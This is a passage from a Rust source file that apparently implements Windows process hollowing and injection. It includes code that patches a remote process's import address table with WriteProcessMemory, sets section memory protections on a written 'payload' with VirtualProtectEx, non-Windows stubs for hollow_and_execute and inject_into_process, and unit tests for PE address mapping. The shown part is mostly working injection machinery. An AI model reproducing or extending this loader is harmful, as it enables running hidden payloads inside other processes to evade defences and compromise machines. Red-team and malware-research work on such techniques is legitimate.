                let iat_remote = (remote_base + iat_rva) as *mut c_void;
                WriteProcessMemory(
                    hprocess,
                    iat_remote,
                    &func_addr as *const _ as _,
                    8,
                    written,
                );
            }
            thunk_off += 8;
            iat_rva += 8;
        }
        desc_off += 20;
    }
    Ok(())
}

/// Apply per-section memory protections after the payload has been written (2.4).
/// Sections with the execute flag get PAGE_EXECUTE_READ; writable-only get
/// PAGE_READWRITE; everything else gets PAGE_READONLY.
#[cfg(windows)]
unsafe fn apply_section_protections(
    hprocess: *mut c_void,
    remote_base: usize,
    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS64,
) {
    use winapi::um::memoryapi::VirtualProtectEx;
    use winapi::um::winnt::{PAGE_EXECUTE_READ, PAGE_READONLY, PAGE_READWRITE};

    const SCN_EXEC: u32 = 0x2000_0000;
    const SCN_WRITE: u32 = 0x8000_0000;

    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
    let first_section = (nt as usize + std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS64>())
        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
    for i in 0..num_sections {
        let sec = &*first_section.add(i);
        let chars = sec.Characteristics;
        let protect = match (chars & SCN_EXEC != 0, chars & SCN_WRITE != 0) {
            (true, true) => PAGE_EXECUTE_READ, // downgrade W+X: no legitimate code section needs RWX
            (true, false) => PAGE_EXECUTE_READ,
            (false, true) => PAGE_READWRITE,
            (false, false) => PAGE_READONLY,
        };
        let virt_size = (*sec.Misc.VirtualSize() as usize).max(sec.SizeOfRawData as usize);
        if virt_size == 0 {
            continue;
        }
        let addr = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
        let mut old = 0u32;
        VirtualProtectEx(hprocess, addr, virt_size, protect, &mut old);
    }
}

#[cfg(not(windows))]
pub fn hollow_and_execute(_payload: &[u8]) -> Result<()> {
    Err(anyhow!("hollow_and_execute is only available on Windows"))
}

#[cfg(not(windows))]
pub fn inject_into_process(_pid: u32, _payload: &[u8]) -> Result<()> {
    Err(anyhow!("inject_into_process is only available on Windows"))
}

// ──────────────────────────────────────────────────────────────────────────────
// Unit tests
// ──────────────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::{rva_to_file_offset_sections, SectionDesc};

    /// Build a synthetic section table where raw offsets and virtual addresses
    /// deliberately differ so a naive RVA-as-file-offset would be wrong.
    ///
    /// Layout:
    ///  .text  VA=0x1000  VS=0x200  raw=0x400   (raw ≠ VA)
    ///  .data  VA=0x2000  VS=0x100  raw=0x600   (raw ≠ VA)
    ///  .idata VA=0x3000  VS=0x080  raw=0x700   (IAT section)
    fn synthetic_sections() -> Vec<SectionDesc> {
        vec![
            SectionDesc { virtual_address: 0x1000, virtual_size: 0x200, raw_offset: 0x400 },
            SectionDesc { virtual_address: 0x2000, virtual_size: 0x100, raw_offset: 0x600 },
            SectionDesc { virtual_address: 0x3000, virtual_size: 0x080, raw_offset: 0x700 },
        ]
    }

    #[test]
    fn rva_in_text_section_maps_to_correct_raw_offset() {
        let secs = synthetic_sections();
        // RVA 0x1050 is 0x50 bytes into .text (VA=0x1000, raw=0x400).
        // Expected file offset: 0x400 + 0x50 = 0x450.
        assert_eq!(rva_to_file_offset_sections(0x1050, &secs), 0x450);
    }

    #[test]
    fn rva_in_idata_section_maps_to_iat_raw_offset() {
        let secs = synthetic_sections();
        // RVA 0x3010 is 0x10 bytes into .idata (VA=0x3000, raw=0x700).
        // Expected: 0x700 + 0x10 = 0x710.
        // A naive RVA-as-file-offset would give 0x3010 — wrong.
        assert_eq!(rva_to_file_offset_sections(0x3010, &secs), 0x710);
    }

    #[test]
    fn rva_in_header_area_falls_back_to_identity() {
        let secs = synthetic_sections();
        // RVA below first section VA is in the PE header; maps 1:1.
        assert_eq!(rva_to_file_offset_sections(0x100, &secs), 0x100);
    }

    #[test]
    fn rva_exactly_at_section_start() {
        let secs = synthetic_sections();
        // RVA 0x2000 is exactly the start of .data (raw=0x600).
        assert_eq!(rva_to_file_offset_sections(0x2000, &secs), 0x600);
    }

    #[test]
    fn rva_one_past_section_end_falls_back() {
        let secs = synthetic_sections();
        // RVA 0x2100 is exactly one byte past .data (VA=0x2000, VS=0x100),
        // so it should fall through to the identity fallback.
        assert_eq!(rva_to_file_offset_sections(0x2100, &secs), 0x2100);
    }

    #[test]
    fn non_windows_hollow_and_execute_returns_error() {
        #[cfg(not(windows))]
        {
            let result = super::hollow_and_execute(&[0x4d, 0x5a]);
            assert!(result.is_err());
            assert!(result.unwrap_err().to_string().contains("Windows"));
        }
    }
}
